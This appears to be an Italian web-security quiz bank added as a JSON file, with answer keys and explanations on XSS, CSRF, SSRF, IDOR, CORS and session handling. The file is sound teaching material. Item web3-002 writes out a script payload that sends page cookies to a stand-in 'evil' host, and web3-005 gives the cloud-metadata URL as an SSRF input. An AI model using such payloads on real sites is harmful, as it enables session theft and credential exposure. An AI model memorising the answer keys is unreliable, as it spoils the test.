@@ -1,0 +1,299 @@
+[
+  {
+    "id": "web3-001",
+    "cert": ["Sicurezza Web"],
+    "topics": ["XSS", "Input Validation"],
+    "type": "single",
+    "difficulty": 3,
+    "question": "In un XSS di tipo DOM-based il payload malevolo non transita mai dal server ma viene eseguito perche il codice JavaScript lato client scrive dati non fidati in un sink pericoloso. Quale coppia sorgente-sink e il classico esempio di DOM XSS?",
+    "options": [
+      "location.hash letto e passato a element.innerHTML",
+      "un parametro POST validato lato server e salvato nel database",
+      "un header Content-Type impostato dal server a application/json",
+      "un valore di sessione firmato e verificato lato server"
+    ],
+    "correct": [0],
+    "explanation": "Nel DOM XSS il flusso resta interamente nel browser: una sorgente controllata dall'utente (come location.hash, document.URL o location.search) finisce in un sink che interpreta HTML/JS (innerHTML, document.write, eval). Poiche il server non vede il payload, molti WAF non lo intercettano; la difesa e usare API sicure come textContent e sanitizzare/encodare prima di scrivere nel DOM.",
+    "why_wrong": {
+      "1": "Un parametro POST che passa dal server e viene salvato descrive uno scenario stored/reflected server-side, non DOM-based; inoltre e gia validato.",
+      "2": "Impostare Content-Type application/json e una difesa/comportamento del server, non una sorgente-sink DOM.",
+      "3": "Un valore di sessione firmato e verificato non e una sorgente non fidata scritta in un sink DOM."
+    },
+    "source": "OWASP DOM XSS Prevention"
+  },
+  {
+    "id": "web3-002",
+    "cert": ["Sicurezza Web"],
+    "topics": ["XSS", "OWASP"],
+    "type": "single",
+    "difficulty": 2,
+    "question": "Un'applicazione mostra i commenti degli utenti cosi come inseriti. Un attaccante pubblica un commento contenente <script>fetch('//evil/'+document.cookie)</script> e da quel momento ogni visitatore della pagina esegue lo script. Di quale tipo di XSS si tratta e qual e la difesa primaria?",
+    "options": [
+      "XSS stored; applicare output encoding contestuale in fase di rendering",
+      "XSS reflected; abilitare solo il flag Secure sui cookie",
+      "XSS DOM-based; disabilitare JavaScript nel browser della vittima",
+      "non e XSS ma CSRF; usare un token anti-CSRF"
+    ],
+    "correct": [0],
+    "explanation": "Il payload viene persistito sul server (nel database dei commenti) e servito a tutti gli utenti che visualizzano la pagina: e un XSS stored (persistente), il piu pericoloso perche non richiede di ingannare la singola vittima con un link. La difesa primaria e l'output encoding contestuale al momento del rendering (HTML entity encoding nel corpo, attribute encoding negli attributi), affiancato da CSP e HttpOnly sui cookie.",
+    "why_wrong": {
+      "1": "Il payload e persistito e colpisce tutti i visitatori: e stored, non reflected; il flag Secure protegge solo il trasporto del cookie e non impedisce l'iniezione.",
+      "2": "Il payload passa dal server ed e memorizzato, quindi non e DOM-based; disabilitare JavaScript non e una difesa applicativa realistica.",
+      "3": "L'esecuzione di script arbitrario nel contesto della pagina e per definizione XSS, non CSRF; un token anti-CSRF non blocca l'iniezione di script."
+    },
+    "source": "OWASP XSS Prevention Cheat Sheet"
+  },
+  {
+    "id": "web3-003",
+    "cert": ["Sicurezza Web"],
+    "topics": ["SQL Injection", "Input Validation"],
+    "type": "single",
+    "difficulty": 2,
+    "question": "Quale affermazione descrive correttamente perche le query parametrizzate (prepared statement) neutralizzano la SQL injection?",
+    "options": [
+      "I dati dell'utente vengono inviati separatamente dal testo SQL, quindi non possono alterare la struttura della query",
+      "Applicano automaticamente l'escape dell'HTML sui valori restituiti dal database",
+      "Cifrano la connessione al database rendendo illeggibile il payload",
+      "Eseguono la query come utente a bassi privilegi impedendo qualsiasi lettura"
+    ],
+    "correct": [0],
+    "explanation": "Con un prepared statement il driver invia prima il template SQL con i segnaposto e poi i valori come parametri distinti: il motore ha gia compilato la struttura della query, quindi i dati dell'utente sono trattati sempre come valori e mai come codice SQL, indipendentemente dal contenuto. Questo e strutturalmente superiore al semplice escaping manuale.",
+    "why_wrong": {
+      "1": "L'escaping HTML riguarda l'XSS in output, non la separazione codice/dati verso il database.",
+      "2": "Cifrare la connessione (TLS) protegge il trasporto ma non impedisce che un input malevolo modifichi la query.",
+      "3": "Ridurre i privilegi e una difesa in profondita utile, ma non e il meccanismo con cui i prepared statement bloccano l'injection."
+    },
+    "source": "OWASP SQL Injection Prevention"
+  },
+  {
+    "id": "web3-004",
+    "cert": ["Sicurezza Web"],
+    "topics": ["CSRF", "Autenticazione"],
+    "type": "single",
+    "difficulty": 3,
+    "question": "L'attributo SameSite di un cookie di sessione mitiga il CSRF. Quale comportamento e corretto per il valore SameSite=Lax?",
+    "options": [
+      "Il cookie viene inviato nelle navigazioni top-level in GET ma non nelle richieste cross-site POST",
+      "Il cookie viene inviato in tutte le richieste cross-site, incluse le POST da un dominio esterno",
+      "Il cookie non viene mai inviato, nemmeno quando l'utente naviga direttamente sul sito",
+      "Il cookie viene inviato solo se la connessione usa HTTP in chiaro"
+    ],
+    "correct": [0],
+    "explanation": "SameSite=Lax invia il cookie nelle richieste same-site e nelle navigazioni top-level sicure (tipicamente GET, come cliccare un link verso il sito), ma lo omette nelle richieste cross-site di tipo POST o avviate da sottorisorse/JS. Questo blocca gran parte degli attacchi CSRF che usano form POST cross-site, pur mantenendo l'usabilita dei link entranti. SameSite=Strict e piu restrittivo (omette anche i link entranti).",
+    "why_wrong": {
+      "1": "Inviare il cookie in tutte le richieste cross-site incluse le POST descrive SameSite=None, non Lax.",
+      "2": "Con Lax il cookie viene comunque inviato quando l'utente naviga direttamente sul sito; non e mai omesso del tutto.",
+      "3": "SameSite non dipende dal fatto che la connessione sia in chiaro; il legame con HTTP/HTTPS e governato dal flag Secure."
+    },
+    "source": "OWASP CSRF Prevention"
+  },
+  {
+    "id": "web3-005",
+    "cert": ["Sicurezza Web"],
+    "topics": ["OWASP", "Input Validation"],
+    "type": "single",
+    "difficulty": 3,
+    "question": "Un endpoint riceve un URL fornito dall'utente e ne recupera il contenuto lato server. Un attaccante inserisce http://169.254.169.254/latest/meta-data/ e ottiene credenziali cloud. Di quale vulnerabilita si tratta e qual e la mitigazione piu robusta?",
+    "options": [
+      "SSRF; validare con allow-list di host/schema consentiti e bloccare gli indirizzi interni",
+      "IDOR; aggiungere un controllo di autorizzazione sull'identificatore",
+      "XSS reflected; encodare l'URL prima di mostrarlo in pagina",
+      "Open redirect; verificare il parametro Referer"
+    ],
+    "correct": [0],
+    "explanation": "Far recuperare al server un URL arbitrario e Server-Side Request Forgery (SSRF): l'attaccante costringe il server a interrogare risorse interne, come l'endpoint di metadata cloud 169.254.169.254 che espone credenziali temporanee. La difesa piu robusta e una allow-list di host e schemi consentiti, bloccando esplicitamente indirizzi privati/link-local, risolvendo il DNS e validando l'IP finale per evitare bypass e rebinding.",
+    "why_wrong": {
+      "1": "L'IDOR riguarda l'accesso non autorizzato a oggetti tramite identificatori, non il fetch di URL arbitrari da parte del server.",
+      "2": "Non c'e esecuzione di script nel browser della vittima: e una richiesta lato server, quindi non e XSS.",
+      "3": "L'open redirect reindirizza il browser dell'utente; qui e il server a effettuare la richiesta verso risorse interne, e il Referer non e una difesa affidabile."
+    },
+    "source": "OWASP SSRF Prevention"
+  },
+  {
+    "id": "web3-006",
+    "cert": ["Sicurezza Web"],
+    "topics": ["Controllo accessi", "OWASP"],
+    "type": "single",
+    "difficulty": 2,
+    "question": "Cambiando l'URL /api/fatture/1001 in /api/fatture/1002 un utente autenticato visualizza la fattura di un altro cliente. Quale categoria OWASP descrive il difetto e qual e la correzione corretta?",
+    "options": [
+      "Broken Access Control (IDOR); verificare lato server che l'oggetto appartenga all'utente autenticato",
+      "Security Misconfiguration; rimuovere gli header di debug dalla risposta",
+      "Cryptographic Failure; cifrare gli identificatori con AES",
+      "Injection; usare query parametrizzate sull'ID"
+    ],
+    "correct": [0],
+    "explanation": "E un Insecure Direct Object Reference, sottoinsieme del Broken Access Control: l'applicazione usa l'identificatore fornito dall'utente per recuperare l'oggetto senza verificare che quell'utente ne sia autorizzato. La correzione e un controllo di autorizzazione lato server per ogni richiesta (l'oggetto appartiene al soggetto autenticato?); usare ID non prevedibili aiuta ma non sostituisce il controllo di accesso.",
+    "why_wrong": {
+      "1": "Rimuovere header di debug riguarda la misconfiguration, non risolve il fatto che manca il controllo di proprieta sull'oggetto.",
+      "2": "Cifrare gli ID e security by obscurity: senza controllo di accesso l'oggetto resta accessibile a chi ottiene l'identificatore.",
+      "3": "Non c'e injection: l'ID viene usato legittimamente nella query, il problema e l'assenza di autorizzazione."
+    },
+    "source": "OWASP Access Control Cheat Sheet"
+  },
+  {
+    "id": "web3-007",
+    "cert": ["Sicurezza Web"],
+    "topics": ["Autenticazione", "XSS"],
+    "type": "single",
+    "difficulty": 1,
+    "question": "A cosa serve il flag HttpOnly su un cookie di sessione?",
+    "options": [
+      "Impedisce che il cookie sia letto da JavaScript tramite document.cookie, riducendo il furto in caso di XSS",
+      "Impedisce l'invio del cookie su connessioni HTTP non cifrate",
+      "Limita l'invio del cookie alle sole richieste same-site",
+      "Riduce la durata del cookie a una singola sessione di navigazione"
+    ],
+    "correct": [0],
+    "explanation": "HttpOnly rende il cookie inaccessibile alle API JavaScript lato client (document.cookie): anche se un attaccante riesce a eseguire XSS nella pagina, non puo esfiltrare direttamente il cookie di sessione tramite script. E una difesa in profondita contro il session hijacking, complementare (non alternativa) alla prevenzione dell'XSS stesso.",
+    "why_wrong": {
+      "1": "Impedire l'invio su HTTP in chiaro e compito del flag Secure, non di HttpOnly.",
+      "2": "Limitare alle richieste same-site e la funzione dell'attributo SameSite.",
+      "3": "La durata del cookie e governata da Expires/Max-Age, non da HttpOnly."
+    },
+    "source": "OWASP Session Management Cheat Sheet"
+  },
+  {
+    "id": "web3-008",
+    "cert": ["Sicurezza Web"],
+    "topics": ["XSS", "OWASP"],
+    "type": "single",
+    "difficulty": 3,
+    "question": "In una Content Security Policy quale direttiva/valore introduce il rischio maggiore, indebolendo la protezione contro l'XSS?",
+    "options": [
+      "script-src 'unsafe-inline'",
+      "default-src 'self'",
+      "object-src 'none'",
+      "base-uri 'self'"
+    ],
+    "correct": [0],
+    "explanation": "'unsafe-inline' in script-src consente l'esecuzione di script inline (attributi on*, tag <script> inline), che e esattamente il vettore che la CSP dovrebbe bloccare: la sua presenza vanifica gran parte della protezione anti-XSS. Le CSP robuste evitano 'unsafe-inline' preferendo nonce o hash per gli script legittimi.",
+    "why_wrong": {
+      "1": "default-src 'self' e una base restrittiva sana che limita le origini alle risorse dello stesso sito.",
+      "2": "object-src 'none' e una best practice che blocca plugin/oggetti potenzialmente pericolosi.",
+      "3": "base-uri 'self' e una buona pratica che previene l'iniezione di tag <base> per dirottare gli URL relativi."
+    },
+    "source": "OWASP CSP Cheat Sheet"
+  },
+  {
+    "id": "web3-009",
+    "cert": ["Sicurezza Web"],
+    "topics": ["OWASP", "Controllo accessi"],
+    "type": "single",
+    "difficulty": 3,
+    "question": "Quale configurazione CORS e pericolosa perche permette a qualsiasi sito di leggere risposte autenticate della vittima?",
+    "options": [
+      "Riflettere l'header Origin della richiesta in Access-Control-Allow-Origin insieme ad Access-Control-Allow-Credentials: true",
+      "Impostare Access-Control-Allow-Origin su un singolo dominio partner fidato",
+      "Non inviare alcun header CORS, mantenendo la Same-Origin Policy predefinita",
+      "Consentire solo i metodi GET e HEAD tramite Access-Control-Allow-Methods"
+    ],
+    "correct": [0],
+    "explanation": "Riflettere dinamicamente l'Origin del richiedente in Access-Control-Allow-Origin e contemporaneamente impostare Allow-Credentials: true equivale ad autorizzare qualunque sito a effettuare richieste con i cookie della vittima e a leggerne le risposte: e un bypass della Same-Origin Policy per contenuti autenticati. La specifica infatti vieta di usare il wildcard * con le credenziali, ma la riflessione dell'Origin ne e l'equivalente insicuro.",
+    "why_wrong": {
+      "1": "Autorizzare un singolo dominio partner fidato e la pratica corretta e circoscritta.",
+      "2": "Non inviare header CORS mantiene la SOP, che e sicura per default (nessun cross-origin autorizzato).",
+      "3": "Limitare i metodi consentiti restringe la superficie ed e una scelta prudente."
+    },
+    "source": "OWASP CORS Security"
+  },
+  {
+    "id": "web3-010",
+    "cert": ["Sicurezza Web"],
+    "topics": ["OWASP", "XSS"],
+    "type": "multi",
+    "difficulty": 2,
+    "question": "Quali delle seguenti coppie header/valore rappresentano security header configurati in modo utile e corretto? (seleziona le due corrette)",
+    "options": [
+      "Strict-Transport-Security: max-age=31536000; includeSubDomains",
+      "X-Content-Type-Options: nosniff",
+      "X-Powered-By: PHP/7.4.3",
+      "Access-Control-Allow-Origin: *"
+    ],
+    "correct": [0, 1],
+    "explanation": "HSTS (Strict-Transport-Security) con un max-age lungo e includeSubDomains forza il browser a usare solo HTTPS, mitigando downgrade e SSL stripping. X-Content-Type-Options: nosniff impedisce al browser di indovinare (MIME sniffing) il tipo di contenuto, riducendo attacchi che sfruttano l'interpretazione errata di file. Sono entrambe configurazioni difensive corrette.",
+    "why_wrong": {
+      "2": "X-Powered-By: PHP/7.4.3 espone tecnologia e versione, facilitando il fingerprinting: andrebbe rimosso, non e una difesa.",
+      "3": "Access-Control-Allow-Origin: * disabilita di fatto le restrizioni cross-origin per le risorse; e permissivo e rischioso, specie su endpoint autenticati."
+    },
+    "source": "OWASP Secure Headers Project"
+  },
+  {
+    "id": "web3-011",
+    "cert": ["Sicurezza Web"],
+    "topics": ["Input Validation", "Controllo accessi"],
+    "type": "multi",
+    "difficulty": 3,
+    "question": "Per rendere sicura una funzionalita di upload di file quali due misure sono efficaci e raccomandate? (seleziona le due corrette)",
+    "options": [
+      "Validare il tipo con una allow-list di estensioni/MIME e verificare i magic bytes del contenuto",
+      "Salvare i file fuori dalla web root o servirli senza permesso di esecuzione, con nome generato dal server",
+      "Fidarsi dell'estensione dichiarata nel nome file inviato dal client",
+      "Impostare Content-Type: text/html sui file caricati per uniformita"
+    ],
+    "correct": [0, 1],
+    "explanation": "Un upload sicuro combina validazione del contenuto (allow-list di tipi consentiti piu controllo dei magic bytes, non solo dell'estensione) e una gestione dello storage che impedisca l'esecuzione: salvare fuori dalla web root o servire i file da una directory senza esecuzione, rinominandoli con nomi generati dal server per evitare path traversal e sovrascritture. Cosi si previene la web shell e l'esecuzione di codice.",
+    "why_wrong": {
+      "2": "L'estensione nel nome file e controllata dal client e facilmente falsificabile: fidarsene consente di caricare payload eseguibili.",
+      "3": "Servire i file caricati come text/html e disastroso: trasformerebbe un upload in XSS/esecuzione; si preferisce un Content-Type sicuro e Content-Disposition attachment."
+    },
+    "source": "OWASP File Upload Cheat Sheet"
+  },
+  {
+    "id": "web3-012",
+    "cert": ["Sicurezza Web"],
+    "topics": ["Autenticazione", "Controllo accessi"],
+    "type": "multi",
+    "difficulty": 2,
+    "question": "Quali due pratiche rafforzano correttamente la gestione delle sessioni e dell'autenticazione? (seleziona le due corrette)",
+    "options": [
+      "Rigenerare l'identificatore di sessione subito dopo un login riuscito",
+      "Impostare i cookie di sessione con i flag Secure e HttpOnly",
+      "Inserire l'identificatore di sessione come parametro nell'URL per comodita",
+      "Memorizzare le password degli utenti con hash MD5 senza salt"
+    ],
+    "correct": [0, 1],
+    "explanation": "Rigenerare l'ID di sessione al momento del login previene il session fixation, in cui l'attaccante impone alla vittima un identificatore noto. Impostare i cookie di sessione con Secure (solo HTTPS) e HttpOnly (non leggibili da JS) protegge da intercettazione e da furto via XSS. Sono entrambe misure standard di session management sicuro.",
+    "why_wrong": {
+      "2": "Mettere l'ID di sessione nell'URL lo espone nei log, nella cronologia e nel Referer, facilitandone il furto: e una pessima pratica.",
+      "3": "MD5 senza salt e crittograficamente debole e velocissimo da attaccare con rainbow table/brute force; si usano algoritmi come bcrypt/Argon2 con salt."
+    },
+    "source": "OWASP Authentication Cheat Sheet"
+  },
+  {
+    "id": "web3-013",
+    "cert": ["Sicurezza Web"],
+    "topics": ["CSRF", "Autenticazione"],
+    "type": "truefalse",
+    "difficulty": 2,
+    "question": "Un token anti-CSRF sincronizzato (synchronizer token pattern) protegge efficacemente da CSRF, ma NON impedisce l'esecuzione di un attacco XSS sulla stessa pagina.",
+    "options": ["Vero", "Falso"],
+    "correct": [0],
+    "explanation": "Vero. Il token anti-CSRF garantisce che una richiesta che modifica stato provenga effettivamente dall'applicazione legittima, bloccando il CSRF. Tuttavia, se la pagina e vulnerabile a XSS, lo script iniettato gira nel contesto di origine della vittima e puo leggere il token stesso dal DOM e inviarlo, aggirando la protezione: XSS e CSRF sono minacce distinte e l'XSS puo neutralizzare le difese anti-CSRF.",
+    "source": "OWASP CSRF Prevention"
+  },
+  {
+    "id": "web3-014",
+    "cert": ["Sicurezza Web"],
+    "topics": ["XSS", "Input Validation"],
+    "type": "truefalse",
+    "difficulty": 2,
+    "question": "L'output encoding per prevenire l'XSS deve essere contestuale: lo stesso dato va codificato in modo diverso a seconda che finisca nel corpo HTML, in un attributo, dentro JavaScript o in un URL.",
+    "options": ["Vero", "Falso"],
+    "correct": [0],
+    "explanation": "Vero. Ogni contesto di rendering ha regole di parsing proprie: nel corpo HTML servono le entity, in un attributo l'attribute encoding, dentro un blocco JavaScript l'escaping JS (o meglio evitare del tutto di iniettare in JS), in un URL la percent-encoding. Applicare l'encoding sbagliato per il contesto lascia aperto l'XSS: per questo l'encoding deve essere scelto in base a dove il dato viene inserito.",
+    "source": "OWASP XSS Prevention Cheat Sheet"
+  },
+  {
+    "id": "web3-015",
+    "cert": ["Sicurezza Web"],
+    "topics": ["Crittografia", "Autenticazione"],
+    "type": "truefalse",
+    "difficulty": 2,
+    "question": "Il flag Secure su un cookie ne cifra il contenuto, quindi un cookie con flag Secure puo essere memorizzato in chiaro senza rischi.",
+    "options": ["Vero", "Falso"],
+    "correct": [1],
+    "explanation": "Falso. Il flag Secure non cifra nulla: si limita a garantire che il browser invii il cookie solo su connessioni HTTPS, proteggendone il trasporto dall'intercettazione in chiaro. Il valore del cookie resta leggibile lato server e lato client (salvo HttpOnly per JS); se contiene dati sensibili vanno protetti a parte (per esempio token firmati/cifrati). Confondere trasporto sicuro con cifratura del contenuto e un errore comune.",
+    "source": "OWASP Session Management Cheat Sheet"
+  }
+]
